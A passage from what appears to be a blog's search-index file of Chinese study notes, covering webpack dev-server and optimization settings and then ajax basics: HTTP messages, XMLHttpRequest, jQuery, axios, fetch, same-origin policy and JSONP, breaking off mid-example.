<span class="attr">alias</span>: &#123; </span><br><span class="line">        <span class="attr">$css</span>: <span class="title function_">resolve</span>(__dirname, <span class="string">&#x27;src/css&#x27;</span>) </span><br><span class="line">    &#125;,</span><br><span class="line">     <span class="comment">// 配置省略文件路径的后缀名 </span></span><br><span class="line">     <span class="attr">extensions</span>: [<span class="string">&#x27;.js&#x27;</span>, <span class="string">&#x27;.json&#x27;</span>, <span class="string">&#x27;.jsx&#x27;</span>, <span class="string">&#x27;.css&#x27;</span>], </span><br><span class="line">     <span class="comment">// 告诉 webpack 解析模块是去找哪个目录 </span></span><br><span class="line">      <span class="attr">modules</span>: [<span class="title function_">resolve</span>(__dirname, <span class="string">&#x27;../../node_modules&#x27;</span>), <span class="string">&#x27;node_modules&#x27;</span>] </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="4.5-dev-server">4.5 dev server<a title="#4.5-dev-server" href="#4.5-dev-server"></a></h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">devServer</span>: &#123; </span><br><span class="line">    <span class="comment">// 运行代码的目录 </span></span><br><span class="line">    <span class="attr">contentBase</span>: <span class="title function_">resolve</span>(__dirname, <span class="string">&#x27;build&#x27;</span>), </span><br><span class="line">    <span class="comment">// 监视 contentBase 目录下的所有文件，一旦文件变化就会 reload </span></span><br><span class="line">    <span class="attr">watchContentBase</span>: <span class="literal">true</span>, </span><br><span class="line">    <span class="attr">watchOptions</span>: &#123; </span><br><span class="line">        <span class="comment">// 忽略文件 </span></span><br><span class="line">        <span class="attr">ignored</span>: <span class="regexp">/node_modules/</span> </span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="attr">compress</span>: <span class="literal">true</span>, <span class="comment">// 启动 gzip 压缩  </span></span><br><span class="line">    <span class="attr">port</span>: <span class="number">5000</span>,     <span class="comment">// 端口号</span></span><br><span class="line">    <span class="attr">host</span>: <span class="string">&#x27;localhost&#x27;</span>,     <span class="comment">// 域名 </span></span><br><span class="line">    <span class="attr">open</span>: <span class="literal">true</span>,     <span class="comment">// 自动打开浏览器 </span></span><br><span class="line">    <span class="attr">hot</span>: <span class="literal">true</span>,     <span class="comment">// 开启 HMR 功能  </span></span><br><span class="line">    <span class="attr">clientLogLevel</span>: <span class="string">&#x27;none&#x27;</span>,    <span class="comment">// 不要显示启动服务器日志信息</span></span><br><span class="line">    <span class="comment">// 除了一些基本启动信息以外，其他内容都不要显示 </span></span><br><span class="line">    <span class="attr">quiet</span>: <span class="literal">true</span>, </span><br><span class="line">    <span class="attr">overlay</span>: <span class="literal">false</span>,<span class="comment">// 如果出错了，不要全屏提示~</span></span><br><span class="line">    <span class="comment">// 服务器代理 --&gt; 解决开发环境跨域问题 </span></span><br><span class="line">    <span class="attr">proxy</span>: &#123; </span><br><span class="line">        <span class="comment">// 一旦 devServer(5000)服务器接受到 /api/xxx 的请求，就会把请求转发到另外一个服务器 (3000)</span></span><br><span class="line">        <span class="string">&#x27;/api&#x27;</span>: &#123; </span><br><span class="line">            <span class="attr">target</span>: <span class="string">&#x27;http://localhost:3000&#x27;</span>, </span><br><span class="line">            <span class="comment">// 发送请求时，请求路径重写：将 /api/xxx --&gt; /xxx （去掉/api） </span></span><br><span class="line">            <span class="attr">pathRewrite</span>: &#123; <span class="string">&#x27;^/api&#x27;</span>: <span class="string">&#x27;&#x27;</span> &#125; </span><br><span class="line">        &#125; </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="4.6-optimization">4.6 <strong>optimization</strong><a title="#4.6-optimization" href="#4.6-optimization"></a></h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">optimization</span>: &#123; </span><br><span class="line">    <span class="attr">splitChunks</span>: &#123; </span><br><span class="line">        <span class="attr">chunks</span>: <span class="string">&#x27;all&#x27;</span> </span><br><span class="line">        <span class="comment">// 后面默认值，可以不写~ </span></span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="comment">// 将当前模块的记录其他模块的 hash 单独打包为一个文件 runtime </span></span><br><span class="line">    <span class="comment">// 解决：修改 a 文件导致 b 文件的 contenthash 变化 </span></span><br><span class="line">    <span class="attr">runtimeChunk</span>: &#123; </span><br><span class="line">        <span class="attr">name</span>: <span class="function"><span class="params">entrypoint</span> =&gt;</span> <span class="string">`runtime-<span class="subst">$&#123;entrypoint.name&#125;</span>`</span> </span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="attr">minimizer</span>: [ </span><br><span class="line">        <span class="comment">// 配置生产环境的压缩方案：js 和 css </span></span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">TerserWebpackPlugin</span>(&#123; </span><br><span class="line">            <span class="comment">// 开启缓存 </span></span><br><span class="line">            <span class="attr">cache</span>: <span class="literal">true</span>, </span><br><span class="line">            <span class="comment">// 开启多进程打包 </span></span><br><span class="line">            <span class="attr">parallel</span>: <span class="literal">true</span>, </span><br><span class="line">            <span class="comment">// 启动 source-map </span></span><br><span class="line">            <span class="attr">sourceMap</span>: <span class="literal">true</span> </span><br><span class="line">        &#125;) </span><br><span class="line">    ] </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> learningNotes </category>
          
      </categories>
      
      
        <tags>
            
            <tag> webpack </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ajax 学习笔记</title>
      <link href="/learningNotes/ajax"/>
      <url>/learningNotes/ajax</url>
      
        <content type="html"><![CDATA[<h2 id="1.简介">1.简介<a title="#1.简介" href="#1.简介"></a></h2><h3 id="1.1-ajax">1.1 ajax<a title="#1.1-ajax" href="#1.1-ajax"></a></h3><p>ajax(asynchronous javascript and xml)，即异步 JS 和 XML</p><p>通过 ajax 可以在浏览器中向服务器发送异步请求，最大的优势 –&gt; 无刷新获取数据</p><p>ajax 是一种将现有标准组合在一起使用的新方式</p><h3 id="1.2-xml">1.2 xml<a title="#1.2-xml" href="#1.2-xml"></a></h3><p>xml 可扩展标记语言</p><p>被设计用来传输和存储数据</p><p>与 html 类似，不同的是 html 中都是预定义标签，而 xml 没有预定于标签，全部是自定义标签，用了表示一些数据</p><h3 id="1.3-json">1.3 json<a title="#1.3-json" href="#1.3-json"></a></h3><p>现在 xml 已经的传输和存储数据的功能已经被 json 取代了</p><h3 id="1.4-ajax-的特点">1.4 ajax 的特点<a title="#1.4-ajax-的特点" href="#1.4-ajax-的特点"></a></h3><h4 id="1.4.1-优点">1.4.1 优点<a title="#1.4.1-优点" href="#1.4.1-优点"></a></h4><ol><li>可以无需刷新页面与服务端进行通信</li><li>允许根据用户事件来更新部分页面内容</li></ol><h4 id="1.4.2-缺点">1.4.2 缺点<a title="#1.4.2-缺点" href="#1.4.2-缺点"></a></h4><ol><li>没有浏览历史，不能回退</li><li>存在跨域问题（同源）</li><li>seo（爬虫） 不友好</li></ol><h2 id="2.-http-报文">2. http 报文<a title="#2.-http-报文" href="#2.-http-报文"></a></h2><h3 id="2.1-http">2.1 http<a title="#2.1-http" href="#2.1-http"></a></h3><p>hypertext transport protocol 超文本传输协议，详细规定了浏览器和万维网服务器之间互相通信的规则</p><h3 id="2.2-请求报文">2.2 请求报文<a title="#2.2-请求报文" href="#2.2-请求报文"></a></h3><blockquote><p>重点：格式、参数</p></blockquote><ul><li><p>行   : POST    /s?ie=utf-8   HTTP/1.1</p></li><li><p>头   : Host: …</p><p>​         Cookie: name=…</p><p>​         Content-type:application/x-www-form-urlencoded</p><p>​         User-Agent:chrome 83</p></li><li><p>空行 :</p></li><li><p>体    : username=admin&amp;password=admin</p></li></ul><h3 id="2.3-响应报文">2.3 响应报文<a title="#2.3-响应报文" href="#2.3-响应报文"></a></h3><ul><li><p>行   : HTTP/1.1  200  OK</p></li><li><p>头   : Content-type: text/html;charset=utf-8</p><p>​         Content-length:2048</p><p>​         Content-encoding:gzip</p></li><li><p>空行 :</p></li><li><p>体    : <code>&lt;html&gt;....&lt;/html&gt;</code></p></li></ul><h3 id="2.4-network-上的请求响应">2.4 network 上的请求响应<a title="#2.4-network-上的请求响应" href="#2.4-network-上的请求响应"></a></h3><ul><li>Headers：请求内容<ul><li>General</li><li>Response Headers：响应头和行</li><li>Requset Headers：请求头和行</li><li>Query String Parameters：请求体<ul><li>get ： 查询字符串的键值对</li><li>post：查询字符串</li></ul></li></ul></li><li>Preview：预览响应过来的html</li><li>Response：响应的内容</li></ul><h2 id="3.-ajax的使用">3. ajax的使用<a title="#3.-ajax的使用" href="#3.-ajax的使用"></a></h2><h3 id="3.1-node-express-的使用">3.1 node express 的使用<a title="#3.1-node-express-的使用" href="#3.1-node-express-的使用"></a></h3><p>使用node express搭建服务器</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> express <span class="keyword">from</span> <span class="string">&#x27;express&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> app = <span class="title function_">express</span>();</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">get</span>(<span class="string">&#x27;/&#x27;</span>, <span class="function">(<span class="params">request, response</span>) =&gt;</span> &#123;</span><br><span class="line">  response.<span class="title function_">send</span>(<span class="string">&#x27;hello express&#x27;</span>);</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">listen</span>(<span class="number">8000</span>, <span class="function">() =&gt;</span> &#123;</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;8000端口监听...&quot;</span>);</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><h3 id="3.2-原生ajax使用">3.2 原生ajax使用<a title="#3.2-原生ajax使用" href="#3.2-原生ajax使用"></a></h3><ol><li><p>创建对象</p> <figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> xhr = <span class="keyword">new</span> <span class="title class_">XMLHttpRequest</span>();</span><br></pre></td></tr></table></figure></li><li><p>初始化 设置请求方法和url</p> <figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">xhr.<span class="title function_">open</span>(<span class="string">&#x27;GET&#x27;</span>,<span class="string">&#x27;http://127.0.0.1:8000/server&#x27;</span>);</span><br></pre></td></tr></table></figure></li><li><p>发送 设置参数</p> <figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">xhr.<span class="title function_">send</span>();</span><br><span class="line">xhr.<span class="title function_">send</span>(<span class="string">&#x27;a=10&amp;b=20&#x27;</span>);</span><br></pre></td></tr></table></figure></li><li><p>事件绑定 处理服务端返回的结果</p> <figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">xhr.<span class="property">onreadystatechange</span> = <span class="keyword">function</span>(<span class="params"></span>)&#123;...&#125;</span><br></pre></td></tr></table></figure><blockquote><p>其中 readystate 是 xhr 对象的属性，<br>其值为 0:初始状态 1:open后  2:send后  3:返回部分数据 4:返回全部数据</p></blockquote><blockquote><p>其中 xhr的对象<br>state:状态码 statusText:状态字符串 getAllResponseHeader():所有响应头 response:响应体</p></blockquote></li></ol><ul><li><p>服务器端要做的操作：解决跨域问题</p>  <figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">response.<span class="title function_">setHeader</span>(<span class="string">&#x27;Access-Control-Allow-Origin&#x27;</span>,<span class="string">&#x27;*&#x27;</span>);</span><br></pre></td></tr></table></figure></li><li><p>if 设置请求头 :  在send前</p>   <figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">xhr.<span class="title function_">setRequestHeader</span>(<span class="string">&#x27;Content-Type&#x27;</span>,<span class="string">&#x27;application/x-www-form-urlencoded&#x27;</span>)</span><br><span class="line">xhr.<span class="title function_">setRequestHeader</span>(<span class="string">&#x27;name&#x27;</span>,<span class="string">&#x27;lee&#x27;</span>)</span><br></pre></td></tr></table></figure><p>则 要在服务器端 设置允许的响应头：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">response.<span class="title function_">setHeader</span>(<span class="string">&#x27;Access-Control-Allow-Headers&#x27;</span>,<span class="string">&#x27;*&#x27;</span>);</span><br></pre></td></tr></table></figure></li><li><p>if 处理后端传的字符串json数据</p><ul><li><p>服务器</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> data = &#123; name : <span class="string">&#x27;lee&#x27;</span> &#125;</span><br><span class="line"><span class="keyword">let</span> str = <span class="title class_">JSON</span>.<span class="title function_">stringify</span>(data);</span><br><span class="line">response.<span class="title function_">send</span>(str)</span><br></pre></td></tr></table></figure></li><li><p>前端处理<br>手动转换数据格式：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> data = <span class="title class_">JSON</span>.<span class="title function_">parse</span>(xhr.<span class="property">response</span>);</span><br><span class="line">res.<span class="property">value</span> = data.<span class="property">name</span>;</span><br></pre></td></tr></table></figure><p>自动转换：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//在open前 设置响应体数据的类型</span></span><br><span class="line">xhr.<span class="property">responseType</span> = <span class="string">&#x27;json&#x27;</span></span><br><span class="line"><span class="comment">//在事件里直接使用就可以了</span></span><br><span class="line">res.<span class="property">value</span> = xhr.<span class="property">response</span>.<span class="property">name</span>;</span><br></pre></td></tr></table></figure></li></ul></li><li><p>解决ie缓存问题：在open中加时间戳 保证每次发生的请求都不一样</p>  <figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">xhr.<span class="title function_">open</span>(<span class="string">&#x27;GET&#x27;</span>,<span class="string">&#x27;http://127.0.0.1:8000/ie?t=&#x27;</span> + <span class="title class_">Date</span>.<span class="title function_">now</span>());</span><br></pre></td></tr></table></figure></li><li><p>处理请求异常<br>服务器可以设置一个定时器，三秒后才返回响应<br>在open前：</p> <figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//超时设置 </span></span><br><span class="line">xhr.<span class="property">timeout</span> = <span class="number">2000</span>;</span><br><span class="line"><span class="comment">//超时回调 </span></span><br><span class="line">xhr.<span class="property">ontimeout</span> = <span class="keyword">function</span>(<span class="params"></span>)&#123; <span class="title function_">alert</span>(<span class="string">&#x27;网络异常，请稍后重试&#x27;</span>) &#125;</span><br><span class="line"><span class="comment">//网络异常回调 可以在f12 使用offline 测试</span></span><br><span class="line">xhr.<span class="property">onerror</span> = <span class="keyword">function</span>(<span class="params"></span>)&#123; <span class="title function_">alert</span>(<span class="string">&#x27;你的网络似乎出现了问题&#x27;</span>) &#125;</span><br></pre></td></tr></table></figure></li><li><p>取消发送请求事件</p>  <figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> x = <span class="literal">null</span>;</span><br><span class="line"><span class="comment">//发送请求 x 为 前面的xhr对象</span></span><br><span class="line"><span class="comment">//使用 x.abort() 可以取消发送请求</span></span><br><span class="line"><span class="comment">//利用这个方法可以处理 多次发送请求 只保留一个请求的情况</span></span><br></pre></td></tr></table></figure></li></ul><h4 id="3.2.1-原生ajax案例-–-点击按钮-将响应的数据放在文本框里">3.2.1 原生ajax案例 – 点击按钮 将响应的数据放在文本框里<a title="#3.2.1-原生ajax案例-–-点击按钮-将响应的数据放在文本框里" href="#3.2.1-原生ajax案例-–-点击按钮-将响应的数据放在文本框里"></a></h4><h3 id="3.3-jquery-中的-ajax">3.3 jquery 中的 ajax<a title="#3.3-jquery-中的-ajax" href="#3.3-jquery-中的-ajax"></a></h3><ol><li><p>get/post请求<br><code>$.get/post(url, data请求携带的参数, callback成功时的回调函数, type返回数据格式)  后面三个参数可选填</code></p>  <figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$.<span class="title function_">get</span>(<span class="string">&#x27;http://127.0.0.1:8000/jq-server&#x27;</span>, &#123;<span class="attr">a</span>:<span class="number">10</span>,<span class="attr">b</span>:<span class="number">20</span>&#125;, <span class="keyword">function</span>(<span class="params">data</span>)&#123;</span><br><span class="line">      <span class="title function_">log</span>(data);</span><br><span class="line">&#125;,<span class="string">&#x27;json&#x27;</span>)</span><br></pre></td></tr></table></figure></li><li><p>ajax通用请求</p>  <figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"> $.<span class="title function_">ajax</span>(&#123;</span><br><span class="line">      <span class="attr">url</span>:<span class="string">&#x27;http://127.0.0.1:8000/delay&#x27;</span>,   <span class="comment">//url</span></span><br><span class="line">      <span class="attr">data</span>: &#123;<span class="attr">a</span>:<span class="number">10</span>,<span class="attr">b</span>:<span class="number">20</span>&#125;,       <span class="comment">//参数</span></span><br><span class="line">      <span class="attr">type</span>: <span class="string">&#x27;GET&#x27;</span>,             <span class="comment">//请求类型</span></span><br><span class="line">      <span class="attr">dataType</span>:<span class="string">&#x27;json&#x27;</span>,         <span class="comment">//响应体结果</span></span><br><span class="line">      <span class="attr">success</span>:<span class="keyword">function</span>(<span class="params">data</span>)&#123;  <span class="comment">//成功回调</span></span><br><span class="line">           <span class="title function_">log</span>(data);</span><br><span class="line">      &#125;,</span><br><span class="line">      <span class="attr">timeout</span>:<span class="number">2000</span>,            <span class="comment">//超时回调</span></span><br><span class="line">      <span class="attr">error</span>:<span class="keyword">function</span>(<span class="params"></span>)&#123;...&#125;    <span class="comment">//失败回调</span></span><br><span class="line">     <span class="attr">headers</span>:&#123;...&#125;            <span class="comment">//自定义头部</span></span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure></li></ol><h3 id="3.4-axios">3.4 axios<a title="#3.4-axios" href="#3.4-axios"></a></h3><ol><li><p>导入axios加载文件 bootcdn</p></li><li><p>axios可以配置 baseURL</p> <figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">axios.<span class="property">defaults</span>.<span class="property">baseURL</span> = <span class="string">&#x27;http://127.0.0.1:8000&#x27;</span>;</span><br></pre></td></tr></table></figure></li><li><p>axios使用 返回promise对象<br>get请求: axios.get(url [, config] )<br>post请求: axios.post(url [, data [, config]] ) //第二个是请求体参数<br>axios请求: axios(config)</p> <figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"> axios.<span class="title function_">get</span>(<span class="string">&#x27;/axios-server&#x27;</span>,&#123;</span><br><span class="line">       <span class="attr">params</span>:&#123;          <span class="comment">//url参数</span></span><br><span class="line">            <span class="attr">id</span>:<span class="number">100</span>,</span><br><span class="line">            <span class="attr">vip</span>:<span class="number">7</span></span><br><span class="line">       &#125;,</span><br><span class="line">       <span class="attr">headers</span>:&#123;         <span class="comment">//请求头信息</span></span><br><span class="line">            <span class="attr">name</span>:<span class="string">&#x27;lee&#x27;</span>,</span><br><span class="line">            <span class="attr">age</span>:<span class="string">&#x27;20&#x27;</span></span><br><span class="line">       &#125;</span><br><span class="line">&#125;).<span class="title function_">then</span>(<span class="function"><span class="params">value</span> =&gt;</span> &#123; ... &#125; )</span><br></pre></td></tr></table></figure> <figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"> axios.<span class="title function_">post</span>(<span class="string">&#x27;/axios-server&#x27;</span>,&#123; <span class="attr">username</span>:<span class="string">&#x27;admin&#x27;</span>, <span class="attr">password</span>:<span class="string">&#x27;admin&#x27;</span> &#125;,&#123;</span><br><span class="line">       <span class="attr">params</span>:&#123;          <span class="comment">//url参数</span></span><br><span class="line">            <span class="attr">id</span>:<span class="number">100</span>,</span><br><span class="line">            <span class="attr">vip</span>:<span class="number">7</span></span><br><span class="line">       &#125;,</span><br><span class="line">       <span class="attr">headers</span>:&#123;         <span class="comment">//请求头信息</span></span><br><span class="line">            <span class="attr">name</span>:<span class="string">&#x27;lee&#x27;</span>,</span><br><span class="line">            <span class="attr">age</span>:<span class="string">&#x27;20&#x27;</span></span><br><span class="line">       &#125;</span><br><span class="line">&#125;).<span class="title function_">then</span>(<span class="function"><span class="params">value</span> =&gt;</span> &#123; ... &#125; )</span><br></pre></td></tr></table></figure> <figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_">axios</span>(&#123;</span><br><span class="line">    <span class="attr">method</span>:<span class="string">&#x27;POST&#x27;</span>,              <span class="comment">//请求方法</span></span><br><span class="line">    <span class="attr">url</span>:<span class="string">&#x27;/axios-server&#x27;</span>,        <span class="comment">//url</span></span><br><span class="line">    <span class="attr">params</span>:&#123;<span class="attr">id</span>:<span class="number">100</span>, <span class="attr">vip</span>:<span class="number">7</span> &#125;,    <span class="comment">//url参数</span></span><br><span class="line">    <span class="attr">headers</span>:&#123; a=<span class="number">10</span>, b=<span class="number">20</span> &#125;,     <span class="comment">//头信息</span></span><br><span class="line">    <span class="attr">data</span>:&#123; <span class="attr">username</span>:<span class="string">&#x27;admin&#x27;</span>, <span class="attr">password</span>:<span class="string">&#x27;admin&#x27;</span> &#125;,  <span class="comment">//请求体参数</span></span><br><span class="line">&#125;).<span class="title function_">then</span>( <span class="function"><span class="params">res</span> =&gt;</span> &#123; <span class="title function_">log</span>(res) &#125; )</span><br></pre></td></tr></table></figure></li></ol><h3 id="3.5-fetch">3.5 fetch<a title="#3.5-fetch" href="#3.5-fetch"></a></h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_">fetch</span>(<span class="string">&#x27;http://127.0.0.1:8000/fecth-server?vip=10&#x27;</span>,&#123;</span><br><span class="line">    <span class="attr">method</span>:<span class="string">&#x27;POST&#x27;</span>,                          <span class="comment">//请求方法</span></span><br><span class="line">    <span class="attr">headers</span>:&#123; <span class="attr">name</span>:<span class="string">&#x27;lee&#x27;</span> &#125;,                 <span class="comment">//请求头</span></span><br><span class="line">    <span class="attr">body</span>:<span class="string">&#x27;username=admin&amp;password=admin&#x27;</span>    <span class="comment">//请求体</span></span><br><span class="line">&#125;).<span class="title function_">then</span>(<span class="function"><span class="params">res</span> =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> res.<span class="title function_">text</span>();  <span class="comment">//字符串</span></span><br><span class="line">    <span class="keyword">return</span> res.<span class="title function_">json</span>();  <span class="comment">//json</span></span><br><span class="line">&#125;).<span class="title function_">then</span>(<span class="function"><span class="params">res</span> =&gt;</span> &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(res)</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><h2 id="4.-跨域问题">4. 跨域问题<a title="#4.-跨域问题" href="#4.-跨域问题"></a></h2><h3 id="4.1同源策略">4.1同源策略<a title="#4.1同源策略" href="#4.1同源策略"></a></h3><p>浏览器的一种安全策略</p><p>同源：协议、域名、端口号完全相同</p><p>违背同源策略就是跨域</p><h3 id="4.2-同源的一个例子">4.2 同源的一个例子<a title="#4.2-同源的一个例子" href="#4.2-同源的一个例子"></a></h3><p>html页面跟 发送请求时同一个地址</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//server.js</span></span><br><span class="line">...</span><br><span class="line">app.<span class="title function_">get</span>(<span class="string">&#x27;/home&#x27;</span>,<span class="function">(<span class="params">req,res</span>) =&gt;</span> &#123;</span><br><span class="line">    res.<span class="title function_">sendFile</span>(__dirname + <span class="string">&#x27;/index.html&#x27;</span>);  <span class="comment">//响应一个页面</span></span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">get</span>(<span class="string">&#x27;/data&#x27;</span>,<span class="function">(<span class="params">req,res</span>) =&gt;</span> &#123;</span><br><span class="line">    res.<span class="title function_">send</span>(<span class="string">&#x27;用户数据&#x27;</span>);   <span class="comment">//请求数据</span></span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//index.html</span></span><br><span class="line">...</span><br><span class="line">btn.<span class="property">onlick</span> = <span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="keyword">const</span> xhr = <span class="keyword">new</span> <span class="title class_">XMLHttpRequest</span>();</span><br><span class="line">    <span class="comment">// 因为是同源的 所以url 可以简写</span></span><br><span class="line">    xhr.<span class="title function_">open</span>(<span class="string">&#x27;GET&#x27;</span>,<span class="string">&#x27;/data&#x27;</span>);</span><br><span class="line">    xhr.<span class="title function_">send</span>();</span><br><span class="line">    xhr.<span class="property">onreadystatechange</span> = <span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">        ...</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="4.3-jsonp-原理">4.3 jsonp 原理<a title="#4.3-jsonp-原理" href="#4.3-jsonp-原理"></a></h3><p>主要就是利用了 <code>script</code> 标签的<code>src</code>没有跨域限制来完成的</p><p>缺点：</p><ul><li>只能进行<code>GET</code>请求</li></ul><p>优点：</p><ul><li>兼容性好，在一些古老的浏览器中都可以运行</li></ul><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//server.js</span></span><br><span class="line">app.<span class="title function_">all</span>(<span class="string">&#x27;/jsonp&#x27;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="comment">// res.send(&#x27;console.log(hello jsonp)&#x27;)</span></span><br><span class="line">  <span class="keyword">const</span> data = &#123;</span><br><span class="line">    <span class="attr">name</span>: <span class="string">&#x27;lee&#x27;</span></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  res.<span class="title function_">end</span>(<span class="string">`handle(<span 